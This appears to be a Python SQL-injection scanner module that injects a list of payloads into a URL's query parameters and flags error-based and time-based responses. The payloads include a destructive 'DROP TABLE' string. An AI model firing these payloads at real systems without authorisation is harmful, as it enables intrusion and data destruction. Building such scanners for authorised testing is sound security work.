import requests
import re
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; CyberWings-Scanner/1.0)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

# Common SQL error signatures
SQL_ERRORS = [
    r"SQL syntax.*?MySQL",
    r"Warning.*?mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL server",
    r"MySqlException",
    r"ORA-[0-9]{4,5}",
    r"Oracle.*?Driver",
    r"Warning.*?oci_",
    r"Warning.*?ora_",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark",
    r"Microsoft.*?ODBC.*?SQL Server",
    r"ODBC SQL Server Driver",
    r"\[SQL Server\]",
    r"Incorrect syntax near",
    r"SQLServer JDBC Driver",
    r"SQLiteException",
    r"SQLite.*?error",
    r"Warning.*?sqlite_",
    r"SQLITE_ERROR",
    r"PostgreSQL.*?ERROR",
    r"Warning.*?pg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"DB2 SQL error",
    r"SQLSTATE",
    r"Sybase message",
    r"Warning.*?sybase",
    r"You have an error in your SQL syntax",
    r"supplied argument is not a valid MySQL",
    r"Column count doesn't match",
    r"quoted string not properly terminated",
    r"unexpected end of SQL command",
    r"Fatal error.*SQL",
    r"SQLCODE",
]

# Basic SQLi payloads
SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'x'='x",
    "1; DROP TABLE--",
    "' AND 1=2--",
    "admin'--",
    "' UNION SELECT NULL--",
    "1' AND SLEEP(2)--",
]


def inject_payload(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def check_sql_injection(url: str) -> dict:
    result = {
        "url": url,
        "vulnerable": False,
        "risk_level": "Low",
        "parameters_tested": [],
        "vulnerable_params": [],
        "findings": [],
        "error": None,
        "total_tests": 0,
    }

    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # Try to detect forms or just test the base URL with a dummy param
            result["findings"].append({
                "type": "info",
                "message": "No URL parameters found. Testing base URL with injected param.",
            })
            # Add a test param
            test_url = url + ("?" if "?" not in url else "&") + "id=1"
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)

        result["parameters_tested"] = list(params.keys())

        for param in params:
            for payload in SQLI_PAYLOADS:
                result["total_tests"] += 1
                test_url = inject_payload(url if params else test_url, param, payload)

                try:
                    start = time.time()
                    resp = requests.get(test_url, headers=HEADERS, timeout=8, allow_redirects=True)
                    elapsed = time.time() - start
                    body = resp.text

                    for pattern in SQL_ERRORS:
                        if re.search(pattern, body, re.IGNORECASE):
                            result["vulnerable"] = True
                            result["vulnerable_params"].append(param)
                            result["findings"].append({
                                "type": "error_based",
                                "param": param,
                                "payload": payload,
                                "pattern": pattern,
                                "message": f"SQL error signature detected in response for param '{param}'",
                                "evidence": re.search(pattern, body, re.IGNORECASE).group(0)[:100],
                            })
                            break

                    # Time-based blind detection
                    if "SLEEP" in payload.upper() and elapsed > 1.8:
                        result["vulnerable"] = True
                        result["vulnerable_params"].append(param)
                        result["findings"].append({
                            "type": "time_based",
                            "param": param,
                            "payload": payload,
                            "message": f"Time-based SQLi possible for param '{param}' (response took {elapsed:.2f}s)",
                        })

                except requests.exceptions.Timeout:
                    # Possible time-based for sleep payloads
                    if "SLEEP" in payload.upper():
                        result["findings"].append({
                            "type": "possible_time_based",
                            "param": param,
                            "payload": payload,
                            "message": f"Request timed out for SLEEP payload on param '{param}' — possible time-based SQLi",
                        })
                except requests.exceptions.RequestException:
                    pass

            # Deduplicate
            result["vulnerable_params"] = list(set(result["vulnerable_params"]))

        if result["vulnerable"]:
            result["risk_level"] = "Critical"
        else:
            result["risk_level"] = "Low"
            result["findings"].append({
                "type": "info",
                "message": "No SQL injection vulnerabilities detected in tested parameters.",
            })

    except Exception as e:
        result["error"] = f"Scanner error: {str(e)}"

    return result
